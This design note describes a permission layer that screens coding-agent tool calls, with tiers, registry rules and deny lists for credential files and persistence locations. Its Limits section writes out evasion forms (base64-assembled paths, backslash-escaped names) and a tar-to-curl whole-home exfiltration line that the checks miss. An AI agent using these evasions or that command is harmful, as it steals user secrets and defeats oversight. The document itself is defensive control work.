# Action tiers (v1, 2026-10-25)

Implementation: `adom/enforcement/action_tiers.py`. First adapter: the coding-agent hooks
in `cursor_hook/` (Cursor and Claude Code). Tests: `cursor_hook/test_action_tiers.py`.

## Problem

Since the Oct 11 hardening, `action_kernel.screen_action` denies any tool without an exact
grant, and treats a flag as "review required", never as permission. That is the right
default, but nothing gave a tool its grant. In the coding-agent hooks this meant every
file read and every MCP call was denied in enforce mode (Oct 22 re-run:
`test_non_write_tools_never_false_block` failed on a plain Read).

## Tiers

| Tier | Meaning | Examples |
|---|---|---|
| observe | reads local state only | Read, Grep, Glob, read_file |
| local_write | changes local state | Write, Edit, delete_file |
| consequential | leaves the machine or acts for the user | WebFetch, WebSearch, send_email |
| unknown | nothing trusted has classified it | any new MCP tool |

Sources, in order of trust: the built-in table for the agent (vendor tools, run under the
agent's own permission prompts), then the operator registry `~/.adom/tool_tiers.json`
(written by a person; the hooks deny agent writes to `~/.adom`), then nothing.

## Invariants (each one has a test)

1. MCP tools are never built-ins, even when named like one (`mcp:read_file` is unknown).
2. Unknown MCP tools are denied. A name-based `proposed_tier` is logged for review and is
   never authority (`watch.py --unclassified` lists them).
3. Tool hints (`openWorldHint`, `destructiveHint`) only raise a tier; `readOnlyHint` is
   ignored.
4. The registry can tighten a built-in, never loosen it.
5. A malformed registry is treated as empty: every MCP tool is denied, and the reason says so.
6. Credential stores are denied at every tier, for reads, writes, Grep over the directory
   and shell commands (`~/.ssh` private keys, `~/.aws/credentials`, gcloud, Azure, kube,
   docker, gh, `.netrc`, `.git-credentials`, keychains, gpg). In a coding agent, a read
   puts the file in the model's context, which is egress to the model provider. Symlinks,
   symlinked directories, hard links, `..`, `$HOME`, `~` and case variants resolve.
7. Writes to persistence locations are denied (shell startup files, `~/.ssh/*`,
   LaunchAgents/Daemons, autostart, `/etc`, `.git/hooks`).
8. Consequential and unknown tools are scanned for credential-shaped values in their
   arguments (ADOM's existing secret shapes); a hit is denied.
9. A registry-granted tool is screened by the kernel with an exact grant for that one tool
   and the entry's `approved_outbound`. A kernel block always wins.
10. One opt-in exception, per registry entry: `agent_approval: true` (consequential tier,
    non-empty `approved_outbound` required) lets the kernel's "review required" flag be
    satisfied by the agent's own approval prompt. Hard kernel signals (unapproved
    destination, secret, taint, fail-closed) still block. Default is off.
11. The opt-in is honoured only when ADOM can confirm a person sees that prompt
    (`cursor_hook/adom_agent_permissions.py`). Claude Code: not if permissions are bypassed
    (`permission_mode` or `defaultMode: bypassPermissions`), not if the tool matches an
    `allow` rule (exact, bare server, or glob) in managed, user or project settings without a
    matching `ask` rule, and not if any settings file is unreadable. Cursor: never (its
    auto-run state has no stable place to read). The MCP gateway cannot see the client, so it
    honours the opt-in only when the operator starts it with `--client-prompts-confirmed`.
    Limit: approvals a client keeps only in memory for the session are invisible to ADOM.

## Registry format

```json
{
  "version": 1,
  "tools": {
    "mcp__notes__get_note": {"tier": "observe"},
    "mcp__github__create_issue": {"tier": "consequential",
                                  "approved_outbound": ["api.github.com"],
                                  "agent_approval": true,
                                  "note": "approved by operator 2026-10-25"}
  }
}
```

Keys are the tool names exactly as the hook log records them (`mcp:<name>` for Cursor,
`mcp__server__tool` for Claude Code).

## Limits

- Path and shell checks are deterministic text and filesystem checks. They catch direct
  paths, globs, quoting, symlinks and hard links; they do not catch a path assembled at run
  time (`cat $(echo <base64> | base64 -d)`) or backslash-escaped names (`~/.ss\h/id_e*`).
  Recorded adversarial sweep: 13 of 16 shell attempts caught; 1 false block in 24 benign
  commands (`cat ~/.kube/../notes.txt`).
- Whole-home exfiltration (`tar cz ~ | curl -T - ...`) is not a credential-path signal;
  network commands are still not inspected by the shell hook.
- Unknown vendor (non-MCP) tools are deferred to the agent's own approval and logged, not
  denied, so a new Cursor or Claude Code tool does not break sessions. Classify them in
  the built-in table when they appear.
- The kernel's review-required flag still blocks registry consequential tools unless the
  entry opts in to `agent_approval`.
